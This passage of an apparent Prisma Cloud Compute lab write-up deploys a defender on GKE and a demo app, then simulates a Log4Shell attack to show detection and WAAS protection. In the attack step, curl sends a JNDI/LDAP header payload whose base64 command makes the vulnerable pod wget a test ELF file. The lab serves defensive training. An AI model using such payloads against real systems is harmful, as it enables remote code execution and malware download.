    matchLabels:
      app: twistlock-defender
  template:
    metadata:
      annotations:
        container.apparmor.security.beta.kubernetes.io/twistlock-defender: unconfined
      labels:
        app: twistlock-defender
    spec:
      serviceAccountName: twistlock-service
      restartPolicy: Always
      containers:
      - name: twistlock-defender
        image: registry-auth.twistlock.com/tw_wgdhemeo0dlxlflyhtmeob8uo4t1ffky/twistlock/defender:defender_21_08_525
        volumeMounts:
        - name: data-folder
          mountPath: "/var/lib/twistlock"
        - name: certificates # Setting the certificates mount after data-folder since it is nested and was overridden in CRI based GKE cluster
          mountPath: "/var/lib/twistlock/certificates"
        - name: docker-sock-folder
          mountPath: "/var/run"
        - name: passwd
          mountPath: "/etc/passwd"
          readOnly: true
        - name: docker-netns
          mountPath: "/var/run/docker/netns"
          readOnly: true
        - name: syslog-socket
          mountPath: "/dev/log"
        - name: auditd-log
          mountPath: "/var/log/audit"
        - name: cri-data
          mountPath: "/var/lib/containers"
        - name: iptables-lock
          mountPath: "/run"
        env:
        - name: WS_ADDRESS
          value: wss://34.135.233.230:8084
        - name: DEFENDER_TYPE
          value: cri
        - name: DEFENDER_LISTENER_TYPE
          value: "none"
        - name: LOG_PROD
          value: "true"
        - name: SYSTEMD_ENABLED
          value: "false"
        - name: DOCKER_CLIENT_ADDRESS
          value: "/var/run/docker.sock"
        - name: DEFENDER_CLUSTER_ID
          value: "090f6e83-cd4e-b983-c356-9f2cf26dd7f3"
        - name: DEFENDER_CLUSTER
          value: ""
        - name: MONITOR_SERVICE_ACCOUNTS
          value: "true"
        - name: MONITOR_ISTIO
          value: "false"
        - name: COLLECT_POD_LABELS
          value: "false"
        - name: INSTALL_BUNDLE
          value: "eyJzZWNyZXRzIjp7fSwiZ2xvYmFsUHJveHlPcHQiOnsiaHR0cFByb3h5IjoiIiwibm9Qcm94eSI6IiIsImNhIjoiIiwidXNlciI6IiIsInBhc3N3b3JkIjp7ImVuY3J5cHRlZCI6IiJ9fSwibWljcm9zZWdDb21wYXRpYmxlIjpmYWxzZX0="
        - name: HOST_CUSTOM_COMPLIANCE_ENABLED
          value: "false"
        - name: CLOUD_HOSTNAME_ENABLED
          value: "false"
        securityContext:
          readOnlyRootFilesystem: true
          privileged: false
          capabilities:
            add:
            - NET_ADMIN  # Required for process monitoring
            - NET_RAW    # Required for iptables (CNNF, runtime DNS, WAAS). See: https://bugzilla.redhat.com/show_bug.cgi?id=1895032
            - SYS_ADMIN  # Required for filesystem monitoring
            - SYS_PTRACE # Required for local audit monitoring
            - SYS_CHROOT # Required for changing mount namespace using setns
            - MKNOD      # A capability to create special files using mknod(2), used by docker-less registry scanning
            - SETFCAP    # A capability to set file capabilities, used by docker-less registry scanning
            - IPC_LOCK   # Required for perf events monitoring, allowing to ignore memory lock limits
        resources: # See: https://kubernetes.io/docs/concepts/configuration/manage-compute-resources-container/#how-pods-with-resource-requests-are-scheduled
          limits:
            memory: "512Mi"
            cpu: "900m"
          requests:
            cpu: "256m"
      volumes:
      - name: certificates
        secret:
          secretName: twistlock-secrets
          defaultMode: 256
      - name: syslog-socket
        hostPath:
          path: "/dev/log"
      - name: data-folder
        hostPath:
          path: "/var/lib/twistlock"
      - name: docker-netns
        hostPath:
          path: "/var/run/docker/netns"
      - name: passwd
        hostPath:
          path: "/etc/passwd"
      - name: docker-sock-folder
        hostPath:
          path: "/var/run"
      - name: auditd-log
        hostPath:
          path: "/var/log/audit"
      - name: cri-data
        hostPath:
          path: "/var/lib/containers"
      - name: iptables-lock
        hostPath:
          path: "/run"
      hostPID: true
      hostNetwork: true
      dnsPolicy: ClusterFirstWithHostNet
---
apiVersion: v1
kind: Service # Expose the Defender as admission controller. Remark: by default, Defender will not listen on the service port
metadata:
  name: defender
  namespace: twistlock
  labels:
    app: twistlock-defender
spec:
  ports:
  - port: 443
    targetPort: 9998
  selector:
    app: twistlock-defender
```

## Task 3. Connect to Autopilot GKE cluster

1. Return to Cloud Shell. You may need to enter **CTRL-C** to return to the command prompt.

```sh
prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ gcloud container clusters get-credentials autopilot-cluster-1 --region us-central1 --project qwiklabs-gcp-04-a1719f40dd37
Fetching cluster endpoint and auth data.
kubeconfig entry generated for autopilot-cluster-1.
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
```



Once you have deleted the `/var/lib/container` mounts, click **Save**.

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ kubectl create namespace twistlock
kubectl create -f ~/daemonset.yaml
namespace/twistlock created
clusterrole.rbac.authorization.k8s.io/twistlock-view created
clusterrolebinding.rbac.authorization.k8s.io/twistlock-view-binding created
secret/twistlock-secrets created
serviceaccount/twistlock-service created
Warning: Autopilot increased resource requests for DaemonSet twistlock/twistlock-defender-ds to meet requirements. See http://g.co/gke/autopilot-resources
daemonset.apps/twistlock-defender-ds created
service/defender created
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
```

In the Prisma Cloud Console, navigate to **Manage > Defenders** and click the **Manage** tab to see deployed defender. Note the name contains the autopilot GKE  cluster's name, you will see something similar to the following:

1. Navigate to the **Radars > Settings** and enable **Container Network Monitoring** and **Host Network Monitoring**.

1. Navigate to the **Radars > Containers**. You will  see the defender has begun to scan the existing environment and populate the Console with information. (You may have to clear the filter)

   

In the next section you will deploy additional web services. You will  view all of these new Kubernetes Services in the Prisma Cloud Compute  Console in the following section.



## Task 4. Install Web Services

Online Boutique is a cloud-native microservices demo application.  Online Boutique consists of a 10-tier microservices application. The  application is a web-based e-commerce app where users can browse items,  add them to the cart, and purchase them.

Google uses this application to demonstrate use of technologies like  Kubernetes/GKE, Istio, Stackdriver, gRPC and OpenCensus. This  application works on any Kubernetes cluster, as well as Google  Kubernetes Engine. It's easy to deploy with little to no configuration.

1. Run the following command in Cloud Shell to clone the repo:

   ```sh
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ git clone https://github.com/GoogleCloudPlatform/microservices-demo.git
   cd microservices-demo
   Cloning into 'microservices-demo'...
   remote: Enumerating objects: 10895, done.
   remote: Counting objects: 100% (242/242), done.
   remote: Compressing objects: 100% (105/105), done.
   remote: Total 10895 (delta 139), reused 191 (delta 136), pack-reused 10653
   Receiving objects: 100% (10895/10895), 31.68 MiB | 16.77 MiB/s, done.
   Resolving deltas: 100% (8048/8048), done.
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl apply -f ./release/kubernetes-manifests.yaml
   Warning: Autopilot increased resource requests for Deployment default/emailservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/emailservice created
   service/emailservice created
   Warning: Autopilot increased resource requests for Deployment default/checkoutservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/checkoutservice created
   service/checkoutservice created
   Warning: Autopilot increased resource requests for Deployment default/recommendationservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/recommendationservice created
   service/recommendationservice created
   Warning: Autopilot increased resource requests for Deployment default/frontend to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/frontend created
   service/frontend created
   service/frontend-external created
   Warning: Autopilot increased resource requests for Deployment default/paymentservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/paymentservice created
   service/paymentservice created
   Warning: Autopilot increased resource requests for Deployment default/productcatalogservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/productcatalogservice created
   service/productcatalogservice created
   Warning: Autopilot increased resource requests for Deployment default/cartservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/cartservice created
   service/cartservice created
   Warning: Autopilot set default resource requests on Deployment default/loadgenerator for container frontend-check, as resource requests were not specified, and adjusted resource requests to meet requirements. See http://g.co/gke/autopilot-defaults and http://g.co/gke/autopilot-resources
   deployment.apps/loadgenerator created
   Warning: Autopilot increased resource requests for Deployment default/currencyservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/currencyservice created
   service/currencyservice created
   Warning: Autopilot increased resource requests for Deployment default/shippingservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/shippingservice created
   service/shippingservice created
   Warning: Autopilot increased resource requests for Deployment default/redis-cart to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/redis-cart created
   service/redis-cart created
   Warning: Autopilot increased resource requests for Deployment default/adservice to meet requirements. See http://g.co/gke/autopilot-resources
   deployment.apps/adservice created
   service/adservice created
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
   ```

   

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl get pods
NAME                                     READY   STATUS    RESTARTS   AGE
adservice-7dd867497c-nnzgk               1/1     Running   0          6m7s
cartservice-dfbc54944-v49xv              1/1     Running   0          6m16s
checkoutservice-75cd7574b9-c7srt         1/1     Running   0          6m21s
currencyservice-856c44bbc9-vrk5j         1/1     Running   0          6m14s
emailservice-7dc589fd9-wkbzl             1/1     Running   0          6m22s
frontend-5869dbb6c5-5wwcg                1/1     Running   0          43s
loadgenerator-76b599ccc7-d7l49           1/1     Running   0          6m15s
paymentservice-78b8b49f49-bftqd          1/1     Running   0          6m18s
productcatalogservice-5c6c965b55-m6b9f   1/1     Running   0          6m17s
recommendationservice-5774dd9ccc-kn6j6   1/1     Running   0          6m20s
redis-cart-5859bdd48d-mhrth              1/1     Running   0          6m7s
shippingservice-659d8d8cd9-ft2qk         1/1     Running   0          6m7s
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl get service frontend-external | awk '{print $4}'
EXTERNAL-IP
34.28.89.235
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-13.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-14.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-15.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-16.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-17.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-18.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-19.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-20.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-21.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-22.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-23.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-24.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-25.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-26.png)



Browse around the site and purchase some items. By doing this, you are  generating communication traffic. This will allow Prisma Cloud Compute  to learn communication paths between the containers.

Go back to the Prisma Cloud Console. In the **Radars** > **Containers** view, check **default** in filter, then **refresh** in the lower right-hand corner. Additional container services will be visible as well as the communication paths.

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-27.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-28.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-29.png)

Close the connection view and go back to **Radar > Containers**, click the container named **adservice** to see all the information and alerts Prisma Cloud Compute has found that are associated with this container.



## Task 5. Runtime Security and Container Runtime Model

Modern threats require layered runtime protection. When a new [CVE](https://cve.mitre.org/) is announced that affects a container image in your runtime  environment, you need automated runtime protection that secures your  entire environment. Prisma Cloud Compute is able to automatically learn  and build a Contain Model about your environment: network, file system  and processes.

Contain Models are the results of the autonomous learning that Prisma Cloud Compute performs every time it sees a new image in an  environment. A model is the allow list for what a given image should be  doing, across all runtime sensors. Models are automatically created and  maintained by Prisma Cloud Compute and provide an easy way for  administrators to view and understand what Prisma Cloud Compute has  learned about their images. Critically, models are built from both  static analysis (such as building a hashed process map based on parsing  an init script in a Dockerfile ENTRYPOINT) and dynamic **behavioral** analysis (such as observing actual process activity during early runtime of the container).

In this section you will review the Contain Model of a service **adservice** in **Online Boutique** (what Prisma Cloud Compute has learned so far.)

1. Review the information under the **General** tab.
2. Click the **Processes** tab to review all processes run by **adservice**.

You have reviewed the container runtime model learned by Prisma Cloud  Compute. After the learning period, any process, network activity, file  system access, or system call beyond the Contain Model can be detected  as anomalous behavior. You have the option to set a policy to alert,  prevent, or block the anomalous behavior.



### Delete the demo application Online Boutique

Run the following command to delete the demo application:

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl delete -f ~/prisma_cloud_compute_edition/microservices-demo/release/kubernetes-manifests.yaml
deployment.apps "emailservice" deleted
service "emailservice" deleted
deployment.apps "checkoutservice" deleted
service "checkoutservice" deleted
deployment.apps "recommendationservice" deleted
service "recommendationservice" deleted
deployment.apps "frontend" deleted
service "frontend" deleted
service "frontend-external" deleted
deployment.apps "paymentservice" deleted
service "paymentservice" deleted
deployment.apps "productcatalogservice" deleted
service "productcatalogservice" deleted
deployment.apps "cartservice" deleted
service "cartservice" deleted
deployment.apps "loadgenerator" deleted
deployment.apps "currencyservice" deleted
service "currencyservice" deleted
deployment.apps "shippingservice" deleted
service "shippingservice" deleted
deployment.apps "redis-cart" deleted
service "redis-cart" deleted
deployment.apps "adservice" deleted
service "adservice" deleted

student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

## Task 6. Real world use case - Protect Log4Shell vulnerability exploits

### Overview

On December 9, 2021, a remote code execution vulnerability in the  popular Java package Apache Log4j 2 was publicly disclosed. Since the  abrupt release of the vulnerability, numerous exploits had been publicly shared and attackers made use of the opportunity to attack instances in the wild. The vulnerability had been dubbed "Log4Shell."

Log4j is a logging framework designed to be used by any Java  application. Due to its nature, it has been used in various Java  programs from web servers to video games, all affected by this issue. We analyzed this vulnerability and determined that it is of the highest  severity possible, with a score of 10 in CVSS 3.1. The vulnerability was abruptly released, and the ease of exploitation and such a severe  impact of remote code execution makes it an "ideal" vulnerability for  mass exploitation by attackers. Due to the widespread use of log4j, the  severity of the vulnerability, and its ease of exploitation, the  vulnerability had been compared to Shellshock which made a serious  impact on internet security a few years ago.

In this lab, you will simulate the Remote Execution Exploit on this  vulnerability, and demonstrate how easy it is for Prisma Cloud users to  easily detect software components affected by this vulnerability and  protect this exploit.

### Enable WildFire

1. In the Prisma Cloud Console, navigate to **Manage > System**, and then click **Wildfire** tab.
2. In configure wildfire, click on **enable runtime protection** then choose the WildFire cloud region to **Global (US)**.
3. In the **Advanced configuration**, enable **upload files with unknown verdict to WildFire**.
4. Click **Save**.

### Deploy containers

You will deploy four containers in this lab:

- Attacker's Linux - `att-machine`
- Attacker's LDAP server
- vulnerable applications `vul-app1` and `vul-app2`

```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: att-machine
  name: att-machine
spec:
  containers:
  - command:
    - sleep
    - 1d
    image: us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/att-machine:1.0
    name: att-machine
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
---
apiVersion: v1
kind: Service
metadata:
  name: att-svr
spec:
  selector:
    run: att-svr
  clusterIP: None
  ports:
  - name: ldap
    port: 1389
    targetPort: 1389
  - name: web
    port: 8888
    targetPort: 8888
---
apiVersion: v1
kind: Pod
metadata:
  labels:
    run: att-svr
  name: att-svr
  namespace: default
spec:
  containers:
  - image: us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-svr:1.0
    imagePullPolicy: IfNotPresent
    name: att-svr
    ports:
    - containerPort: 8888
      protocol: TCP
      name: web
    - containerPort: 1389
      protocol: TCP
      name: ldap
---
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: vul-app1
  name: vul-app1
spec:
  containers:
  - image: us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-app:1.0
    name: vul-app1
    ports:
    - containerPort: 8080
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
---
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: vul-app2
  name: vul-app2
spec:
  containers:
  - image: us.gcr.io/panw-gcp-team-testing/qwiklab/pcc-log4shell/l4s-demo-app:1.0
    name: vul-app2
    ports:
    - containerPort: 8080
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
```



```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl create -f log4shell.yaml
Warning: Autopilot set default resource requests for Pod default/att-machine, as resource requests were not specified. See http://g.co/gke/autopilot-defaults
pod/att-machine created
service/att-svr created
Warning: Autopilot set default resource requests for Pod default/att-svr, as resource requests were not specified. See http://g.co/gke/autopilot-defaults
pod/att-svr created
Warning: Autopilot set default resource requests for Pod default/vul-app1, as resource requests were not specified. See http://g.co/gke/autopilot-defaults
pod/vul-app1 created
Warning: Autopilot set default resource requests for Pod default/vul-app2, as resource requests were not specified. See http://g.co/gke/autopilot-defaults
pod/vul-app2 created
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl get pod -o wide
NAME          READY   STATUS    RESTARTS   AGE    IP             NODE                                                 NOMINATED NODE   READINESS GATES
att-machine   1/1     Running   0          2m2s   10.136.0.131   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
att-svr       1/1     Running   0          2m1s   10.136.0.132   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
vul-app1      1/1     Running   0          2m1s   10.136.0.133   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
vul-app2      1/1     Running   0          2m1s   10.136.0.134   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

## Task 7. Review log4j vulnerability at Prisma Cloud

1. Return to the Prisma Cloud tab and navigate to **Radars > Containers**. Click the refresh button at the lower right corner.



## Task 8. Create policy rules to detect and protect from log4j exploits

### Manually relearn

1. Inside Prisma Cloud, navigate to **Monitor > Runtime** and then click **Container Models** tab.



### Create WAAS Rule

1. From the Prisma Cloud tab, navigate to **Defend > WAAS** then click **Container** tab and click **Add rule**.

## Task 9. Simulate the attack

1. Navigate to Cloud Shell and issue the following command to get IP addresses of vulnerable app containers **vul-app1** and **vul-app2**:

   ```sh
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl get pod -o wide
   NAME          READY   STATUS    RESTARTS   AGE   IP             NODE                                                 NOMINATED NODE   READINESS GATES
   att-machine   1/1     Running   0          14m   10.136.0.131   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
   att-svr       1/1     Running   0          14m   10.136.0.132   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
   vul-app1      1/1     Running   0          14m   10.136.0.133   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
   vul-app2      1/1     Running   0          14m   10.136.0.134   gk3-autopilot-cluster-1-nap-19vwixj2-d670a303-8clx   <none>           <none>
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec -it att-machine -- /bin/bash
   root@att-machine:/# curl 10.136.0.133:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
   Hello, world!root@att-machine:/#
   ```

   

```sh
root@att-machine:/# echo 'd2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK' | base64 -d
wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/malware-sample
root@att-machine:/#
```

The command embedded is to have **vul-app1** to download a test file and save to `/tmp/malware-sample`.

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec vul-app1 -- ls -l /tmp
total 24
drwxr-xr-x    2 root     root          4096 Apr 30 17:27 hsperfdata_root
-rw-r--r--    1 root     root          8608 Apr 30 17:41 malware-sample
drwx------    2 root     root          4096 Apr 30 17:27 tomcat-docbase.8080.4704614515910759418
drwx------    3 root     root          4096 Apr 30 17:27 tomcat.8080.7293023277248963250
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec vul-app2 -- ls -l /tmp
total 12
drwxr-xr-x    2 root     root          4096 Apr 30 17:27 hsperfdata_root
drwx------    2 root     root          4096 Apr 30 17:27 tomcat-docbase.8080.5932094129325529014
drwx------    3 root     root          4096 Apr 30 17:27 tomcat.8080.8483490475095154737
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

### Disable WAAS rule to test runtime rules

1. From the Prisma Cloud tab, navigate to **Defend > WAAS > Container**. Click three dots at the rule **waas**, then click **Disable**.

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec -it att-machine /bin/bash
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.
root@att-machine:/# curl 10.136.0.134:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
Hello, world!root@att-machine:/# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@att-machine:/#
```

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec vul-app2 -- ls -l /tmp
total 12
drwxr-xr-x    2 root     root          4096 Apr 30 17:27 hsperfdata_root
drwx------    2 root     root          4096 Apr 30 17:27 tomcat-docbase.8080.5932094129325529014
drwx------    3 root     root          4096 Apr 30 17:27 tomcat.8080.8483490475095154737
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```



```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$ kubectl exec vul-app2 -- ls -l /tmp
total 12
drwxr-xr-x    2 root     root          4096 Apr 30 17:27 hsperfdata_root
drwx------    2 root     root          4096 Apr 30 17:27 tomcat-docbase.8080.5932094129325529014
drwx------    3 root     root          4096 Apr 30 17:27 tomcat.8080.8483490475095154737
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition/microservices-demo (qwiklabs-gcp-04-a1719f40dd37)$
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-30.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-31.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-32.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-33.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-34.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-35.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-36.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-37.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-38.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-39.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-40.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-41.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-42.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-43.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-44.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-45.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-46.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-47.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-48.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-49.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-50.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-51.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-52.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-53.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-54.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-55.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-56.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-57.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-58.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-59.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-60.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-61.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-62.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-63.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-64.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-65.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-66.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-67.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-68.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-69.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-70.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-71.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-72.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-73.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-74.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-75.png)











